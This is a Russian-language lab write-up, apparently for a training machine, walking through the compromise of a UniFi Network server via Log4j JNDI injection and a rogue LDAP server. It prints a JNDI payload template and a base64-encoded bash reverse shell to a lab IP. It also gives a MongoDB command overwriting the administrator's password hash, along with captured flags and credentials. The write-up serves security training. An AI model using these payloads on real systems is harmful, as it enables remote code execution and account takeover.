## Результат nmap
```
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
6789/tcp open  ibm-db2-admin?
8080/tcp open  http-proxy
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 431
|     Date: Mon, 05 Dec 2022 14:45:22 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 404 
|     Found</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 
|     Found</h1></body></html>
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 302 
|     Location: http://localhost:8080/manage
|     Content-Length: 0
|     Date: Mon, 05 Dec 2022 14:45:21 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Mon, 05 Dec 2022 14:45:21 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|     Request</h1></body></html>
|   Socks5: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Mon, 05 Dec 2022 14:45:22 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Did not follow redirect to https://10.129.223.253:8443/manage
8443/tcp open  ssl/nagios-nsca Nagios NSCA
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: UniFi Network
|_Requested resource was /manage/account/login?redirect=%2Fmanage
| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
| Subject Alternative Name: DNS:UniFi
| Issuer: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-12-30T21:37:24
| Not valid after:  2024-04-03T21:37:24
| MD5:   e6be 8c03 5e12 6827 d1fe 612d dc76 a919
|_SHA-1: 111b aa11 9cca 4401 7cec 6e03 dc45 5cfe 65f6 d829
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.92%I=7%D=12/5%Time=638E0401%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,84,"HTTP/1\.1\x20302\x20\r\nLocation:\x20http://localhost:8080
SF:/manage\r\nContent-Length:\x200\r\nDate:\x20Mon,\x2005\x20Dec\x202022\x
SF:2014:45:21\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(HTTPOptions,84,"H
SF:TTP/1\.1\x20302\x20\r\nLocation:\x20http://localhost:8080/manage\r\nCon
SF:tent-Length:\x200\r\nDate:\x20Mon,\x2005\x20Dec\x202022\x2014:45:21\x20
SF:GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,24E,"HTTP/1\.1\x204
SF:00\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:
SF:\x20en\r\nContent-Length:\x20435\r\nDate:\x20Mon,\x2005\x20Dec\x202022\
SF:x2014:45:21\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><ht
SF:ml\x20lang=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x2
SF:0Bad\x20Request</title><style\x20type=\"text/css\">body\x20{font-family
SF::Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;ba
SF:ckground-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size
SF::16px;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{c
SF:olor:black;}\x20\.line\x20{height:1px;background-color:#525D76;border:n
SF:one;}</style></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20
SF:Bad\x20Request</h1></body></html>")%r(FourOhFourRequest,24A,"HTTP/1\.1\
SF:x20404\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Langu
SF:age:\x20en\r\nContent-Length:\x20431\r\nDate:\x20Mon,\x2005\x20Dec\x202
SF:022\x2014:45:22\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html
SF:><html\x20lang=\"en\"><head><title>HTTP\x20Status\x20404\x20\xe2\x80\x9
SF:3\x20Not\x20Found</title><style\x20type=\"text/css\">body\x20{font-fami
SF:ly:Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;
SF:background-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-si
SF:ze:16px;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20
SF:{color:black;}\x20\.line\x20{height:1px;background-color:#525D76;border
SF::none;}</style></head><body><h1>HTTP\x20Status\x20404\x20\xe2\x80\x93\x
SF:20Not\x20Found</h1></body></html>")%r(Socks5,24E,"HTTP/1\.1\x20400\x20\
SF:r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en\
SF:r\nContent-Length:\x20435\r\nDate:\x20Mon,\x2005\x20Dec\x202022\x2014:4
SF:5:22\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><html\x20l
SF:ang=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x2
SF:0Request</title><style\x20type=\"text/css\">body\x20{font-family:Tahoma
SF:,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;backgroun
SF:d-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px;}
SF:\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:bl
SF:ack;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}</
SF:style></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20
SF:Request</h1></body></html>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Порт 8080** - это по идеи должен быть веб сервер, но он возвращаает нам 404 с перенаправлением в заголовке (302)

Сервис на порту _8080_ перенаправляет нас на _8443_, который является ещё одним доступным портом:
![[Pasted image 20221206005101.png]]

Однако, напрямую по адресу с портом 8443 мы перейти не можем:
![[Pasted image 20221206183503.png]]
Сообщение получено от развёрнутого сервера, т.к. выглядит оно не как обычный bad request и имеет собственное кастомное сообщение.
Он хочет от нас **tls**, это некий аналог ssh.
**tls** является криптографическим протоколом, как и shh, обеспечивающие защищённую передачу данных между узлами в сети Интернет.

На самом деле нам просто нужно добавить букву s к http:
![[Pasted image 20221206183924.png]]
 Так происходит, потому что данные в протоколе HTTPS передаются поверх криптографических протоколов TLS или SSL.

По номеру версии Unifi мы можем попробовать поискать какой-нибудь эксплойт.

На самом деле если поискать в интернете, то мы видим некий log4j, так что наверное он нам и поможет обойти авторизацию:
![[Pasted image 20221206184422.png]]
log4j - пакет ведения журнала в Java, который позволяет использовать определённый язык выражений для выполнения кода (что-то вроде: `${jndi:ldap//IPaddress/garbageResourse}`).
Сама уязвимость я так понимаю называется **JNDI инъекция** и использует протокол **ldap** для этой иъекции.
> P.S.: 
> В примере введено выражение на языке выражений. Он позволяет выполнять встроенные команды. По сути мы написали шаблон полезной нагрузки.
> 
> Выражения пишутся со знаком доллара перед фигурными скобками, в которых и лежит наше выражение. По факту Java читает содержимое скобок как код, который нужно выполнить.
>
> - **jndi** _(Java Naming and Directory Interface)_ — это набор Java API, организованный в виде службы каталогов, который позволяет Java-клиентам открывать и просматривать данные и объекты по их именам.
> По простому jndi - интерфейс именования каталогов и по сути является API, позволяющим выполнять вызовы для поиска других ресурсов/объектов.
>
>В нашем случае jndi выступает обёрткой. Мы просто сообщаем протоколу как обрабатывать данные, которые он отправляет.
>
> - **Протокол LDAP** _(Lightweight Directory Access Protocol)_ — это интернет-стандарт для доступа к службам каталогов. Работает на порту _389_.
> 
> ldap связан с активным каталогом. ldap будет выступать в роли штуки, которая обеспечивает поиск данных в сети (мы ищем учётные данные аутентификации)
>
> - **IPaddress** — адрес, на котором осуществляется аутентификация.
>
> - **garbageResourse** — какой ресурс запрашивает ldap.

Как только мы отправим наш запрос, данные запишутся в log и проанализируется log4j, который в свою очередь увидит наше выражение и выполнит его (с помощью него можно вытянуть много внутренней информации).

На данном этапе нам нужно внедрить полезную нагрузку (exploit).
Проанализируем http трафик с помощью **Burp Suit**:
![[Pasted image 20221206184906.png]]

Необходимо настроить браузер для работы с прокси:
![[Pasted image 20221206191149.png]]

Так же, чтобы браузер не ругался при заходе на сайты, использующие сертифакты, нужно добавить сертификат burp, как доверенный:
![[VirtualBoxVM_PfEt0WVwd7.png]]
![[M3V9udh89W.png]]

Переходим на изначальную страницу с портом 8080 и прожмякиваем forward в Burp:
![[Pasted image 20221206191902.png]]
Видим, что запросы ловятся, всё круто.
Burp ловит абсолютно всё, он же выступает как прокси, как исходящие запросы к серверу, так и приходящие ответы.

Введя тестовые данные в форму, получаем следующее:
![[Pasted image 20221206192231.png]]

Жмякаем **ctrl + R** и переходим на вкладку Repeater:

В Repeater удобно работать с конкретными запросами и смотреть ответы на них.
Для использования log4j нам как раз нужно иметь возможность отправлять разные заголовки и изменять тело запроса.

Мы хотим сделать обратный вызов в другую систему. В качестве забираемого файл пока что укажем мусор:
![[VirtualBoxVM_aSJ5zHmDMK.png]]
Выкинулась ошибка, но что произошло?

Чтобы просмотреть трафик на tcp порту _389 (порт ldap)_, я использовал **wireshark**:
![[VirtualBoxVM_LwkoIikNiH.png]]
Видим, что есть коннект нашей машинки и целевой, видим весь трафик.
Совершился вызыв, было прочитано наше переданное выражение и ответ вернулся обратно.
Это значит, что выбранный нами параметр действительно уязвим (но вообще, в качестве параметра, подверженного нашей полезной нагрузке, мы могли выбрать один из заголовкой или любой другой параметр из тела запроса).

## Зависимости
Далее нам нужно локально потянуть необходимые зависимости.
![[Pasted image 20221206201317.png]]

### openjdk
**openjdk** - пакет для разработки на java.
![[Pasted image 20221206201402.png]]
Проверяем встала ли java:
![[Pasted image 20221206202455.png]]

### maven
maven поможет скомпилировать наш java код. По факту это сборщик проекта.
![[Pasted image 20221206202231.png]]

### Мошенический jndi
Тут мы клоним репозиторий с мошеническим сервером ldap
![[Pasted image 20221206203243.png]]

Собираем проект:
![[Pasted image 20221206203403.png]]

Результат сборки:
![[Pasted image 20221206203718.png]]

## Обратная оболочка
Возьмём скрипт из прошлых лабораторных и захэшируем его:
![[Pasted image 20221206213413.png]]
base64: `YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTUxLzgwMDEgMD4mMQo=`

Запускаем наш вредоносный сервер ldap со скриптом для получения обратной оболочки:
![[Pasted image 20221206214846.png]]
> На самом деле на скриншоте есть опечатка, которую я не сразу заметил, пропущена запятая в секции с `base64 -d` и хэш был передан не целиком.
> 
> Так же опечатка в слове bash в самом начале.
> 
> А ещё баш скрипт почему-то очень хрупкий и кажется пробелы влияют на его отработку, так что лучше убрать их везде, где только можно

Получился некий чейнинг команд.
Сначала мы говорим, что команда выполняется в inline режиме, после идёт та самая цепочка команд:
- `echo hash`
- декодирование хэша (`base64 -d`)
- интерактивная оболочка bash (`bash -i`)
Ну и далее идёт флаг с id нашего тунелированного ip (`--hostname`)

Установим прослушку на порт, который мы указывали ранее:
![[Pasted image 20221206215545.png]]

Отправим запрос с lmap, сгенерированным нашим злобным сервером:
![[Pasted image 20221206215458.png]]
Пришла 400-ка, но всё окей, так и должно было быть.

Иы получили результат отправки нашего payload:
![[Pasted image 20221206215741.png]]

Всё получилось, мы внутри:
![[Pasted image 20221206223212.png]]

Ищем user flag:
![[Pasted image 20221206225010.png]]
**user flag:** `6ced1a6a89e666c0620cdb10262ba127`

## Повышение привелегий
Можно заметить, что запущен сервис mongodb:
![[Pasted image 20221206225341.png]]

Посмотрим на каком порту он запущен:
![[Pasted image 20221206230315.png]]
**Порт:** `27117`

Попробуем выполнить команду, возвращающую информацию по всем пользователям, являющимся админами (**ace** - дефолтная бд для unifi):
![[Pasted image 20221206230717.png]]
> `db.admin.find()` - функций мы для перечисления пользователей в базе данных в MongoDB

Из первых же строчек мы видим имя пользователя, почту и хэш пароля (`x_shadow`).
`$6` в значении ключа `x_shadow` означает, что это `sha512`. 

Сложность этого алгоритма хэширования просто капец и ломануть мы его навряд ли сможем, поэтому просто перезапишем пароль на свой хэш. Однако, наш пароль должен ещё и соответствовать по сложности, поэтому создадим что-нибудь стандартной сложности (длина >= 8 символов, включим в него заглавную букву и спец символ):
![[Pasted image 20221206231904.png]]

Наш пользователь не может юзать эту утилиту, поэтому создадим пароль в нашей консоли:
![[Pasted image 20221206232005.png]]
**password:** `$6$MOb5UyHQUAu62clu$Q/IRLQbkRuQJsEDCxUZPzchAbjm2Ul1RPfuuEulYfh0GZfGzuDQNXTQ/syO1w..rYaGHF24LW5FQIwEusFYGh0`

Обновить значение x-shadow мы можем по objectId (это как хранятся данные в mongo, id-шник):
`ObjectId("61ce278f46e0fb0012d47ee4")`

Обновляем `x_shadow`:
![[Pasted image 20221206233103.png]]
> Команда выглядит следующим образом: 
> `mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$MOb5UyHQUAu62clu$Q/IRLQbkRuQJsEDCxUZPzchAbjm2Ul1RPfuuEulYfh0GZfGzuDQNXTQ/syO1w..rYaGHF24LW5FQIwEusFYGh0"}})'`

Если мельком взглянем на x_shadow, то вроде бы действительно что-то изменилось:
![[Pasted image 20221206233508.png]]

Теперь через gui авторизуемся как `administrator` с паролем `Password!`:
![[Pasted image 20221206233733.png]]

Сайт на самом деле практически полностью пустой, что грустно, но мы можем найти блок с авторизацией через ssh с данными для входа:
![[Pasted image 20221206234045.png]]
![[Pasted image 20221206234117.png]]
**password root user:**
`NotACrackablePassword4U2022`

![[VirtualBoxVM_fp9DTAFnfU.png]]
**root flag:** `e50bc93c75b634e4b272d2f771c33681`

![[Pasted image 20221207000759.png]]
## Послесловие
Честно говоря я заколебался, пока делал эту лабу. Особенно с моментом, где мы создавали фейковый сервак ldap, у меня банально не приходила обратная оболочка кучу раз, а в один момент и вовсе атакуемая машинка сказала **"Пока, друг!"**

На эту лабу ушло, наверное, 2 вечера по кучу часов. Надеюсь на зачётик!!!